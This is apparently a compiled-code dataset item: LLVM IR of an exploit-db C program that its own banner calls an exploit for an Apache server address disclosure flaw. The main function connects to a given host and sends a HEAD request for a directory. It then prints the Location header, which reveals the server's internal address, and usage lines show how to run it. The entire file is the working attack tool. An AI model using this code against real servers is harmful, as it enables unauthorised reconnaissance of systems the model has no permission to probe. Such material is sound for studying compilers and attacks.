; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_21067.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_21067.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.hostent = type { i64 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [41 x i8] c"Usage: %s <hostname> <port> <directory>\0A\00", align 1
@.str.1 = private unnamed_addr constant [45 x i8] c"Example(verbose): %s www.linux.org 80 /info\0A\00", align 1
@.str.2 = private unnamed_addr constant [61 x i8] c"Example(specify): %s www.linux.org 80 /info | grep Location\0A\00", align 1
@.str.3 = private unnamed_addr constant [63 x i8] c"Example(output) : Location: http://127.0.0.3/supersecretshit/\0A\00", align 1
@.str.4 = private unnamed_addr constant [15 x i8] c"Unknown host.\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [21 x i8] c"Cannot open socket.\0A\00", align 1
@.str.6 = private unnamed_addr constant [30 x i8] c"Could not connect to socket.\0A\00", align 1
@.str.7 = private unnamed_addr constant [75 x i8] c"Disclose - Exploit for the Apache Server Address Disclosure Vulnerability\0A\00", align 1
@.str.8 = private unnamed_addr constant [61 x i8] c"by: magnum - magnum@fuckthat.org - http://www.fuckthat.org\0A\0A\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"HEAD \00", align 1
@.str.10 = private unnamed_addr constant [13 x i8] c" HTTP/1.0\0A\0A\0A\00", align 1
@.str.11 = private unnamed_addr constant [9 x i8] c"Status: \00", align 1
@MAXLEN = common dso_local global i32 0, align 4
@ERROR = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [12 x i8] c"recv error\0A\00", align 1
@.str.13 = private unnamed_addr constant [7 x i8] c"Done.\0A\00", align 1
@.str.14 = private unnamed_addr constant [9 x i8] c"Location\00", align 1
@.str.15 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca [1024 x i8], align 16
  %10 = alloca [1024 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* %4, align 4
  %15 = icmp ne i32 %14, 4
  br i1 %15, label %16, label %31

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str, i64 0, i64 0), i8* %19)
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.1, i64 0, i64 0), i8* %23)
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.2, i64 0, i64 0), i8* %27)
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.3, i64 0, i64 0))
  %30 = call i32 @exit(i32 1) #4
  unreachable

31:                                               ; preds = %2
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = call %struct.hostent* @gethostbyname(i8* %34)
  store %struct.hostent* %35, %struct.hostent** %8, align 8
  %36 = icmp eq %struct.hostent* %35, null
  br i1 %36, label %37, label %40

37:                                               ; preds = %31
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.4, i64 0, i64 0))
  %39 = call i32 @exit(i32 1) #4
  unreachable

40:                                               ; preds = %31
  %41 = load i32, i32* @AF_INET, align 4
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 3
  store i32 %41, i32* %42, align 4
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 2
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @atoi(i8* %45)
  store i32 %46, i32* %12, align 4
  %47 = load i32, i32* %12, align 4
  %48 = call i32 @htons(i32 %47)
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %48, i32* %49, align 4
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  %51 = load %struct.hostent*, %struct.hostent** %8, align 8
  %52 = getelementptr inbounds %struct.hostent, %struct.hostent* %51, i32 0, i32 0
  %53 = load i64, i64* %52, align 8
  %54 = inttoptr i64 %53 to %struct.in_addr*
  %55 = bitcast %struct.in_addr* %50 to i8*
  %56 = bitcast %struct.in_addr* %54 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %55, i8* align 4 %56, i64 4, i1 false)
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %58 = call i32 @bzero(i32* %57, i32 8)
  %59 = load i32, i32* @AF_INET, align 4
  %60 = load i32, i32* @SOCK_STREAM, align 4
  %61 = call i32 @socket(i32 %59, i32 %60, i32 0)
  store i32 %61, i32* %6, align 4
  %62 = icmp eq i32 %61, -1
  br i1 %62, label %63, label %66

63:                                               ; preds = %40
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i64 0, i64 0))
  %65 = call i32 @exit(i32 1) #4
  unreachable

66:                                               ; preds = %40
  %67 = load i32, i32* %6, align 4
  %68 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %69 = call i32 @connect(i32 %67, %struct.sockaddr* %68, i32 4)
  %70 = icmp eq i32 %69, -1
  br i1 %70, label %71, label %74

71:                                               ; preds = %66
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.6, i64 0, i64 0))
  %73 = call i32 @exit(i32 1) #4
  unreachable

74:                                               ; preds = %66
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.7, i64 0, i64 0))
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.8, i64 0, i64 0))
  %77 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %78 = call i32 @strcat(i8* %77, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0))
  %79 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %80 = load i8**, i8*** %5, align 8
  %81 = getelementptr inbounds i8*, i8** %80, i64 3
  %82 = load i8*, i8** %81, align 8
  %83 = call i32 @strcat(i8* %79, i8* %82)
  %84 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %85 = call i32 @strcat(i8* %84, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.10, i64 0, i64 0))
  %86 = call i32 @sleep(i32 1)
  %87 = load i32, i32* %6, align 4
  %88 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %89 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %90 = call i32 @strlen(i8* %89)
  %91 = call i32 @send(i32 %87, i8* %88, i32 %90, i32 0)
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.11, i64 0, i64 0))
  %93 = load i32, i32* %6, align 4
  %94 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %95 = load i32, i32* @MAXLEN, align 4
  %96 = call i32 @recv(i32 %93, i8* %94, i32 %95, i32 0)
  store i32 %96, i32* %13, align 4
  %97 = load i32, i32* @ERROR, align 4
  %98 = icmp eq i32 %96, %97
  br i1 %98, label %99, label %104

99:                                               ; preds = %74
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.12, i64 0, i64 0))
  %101 = load i32, i32* %6, align 4
  %102 = call i32 @close(i32 %101)
  %103 = call i32 @exit(i32 1) #4
  unreachable

104:                                              ; preds = %74
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.13, i64 0, i64 0))
  %106 = load i32, i32* %13, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 %107
  store i8 0, i8* %108, align 1
  %109 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %110 = call i8* @strstr(i8* %109, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.14, i64 0, i64 0))
  store i8* %110, i8** %11, align 8
  %111 = load i8*, i8** %11, align 8
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.15, i64 0, i64 0), i8* %111)
  %113 = load i32, i32* %6, align 4
  %114 = call i32 @close(i32 %113)
  %115 = call i32 @exit(i32 0) #4
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @htons(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @bzero(i32*, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i8* @strstr(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
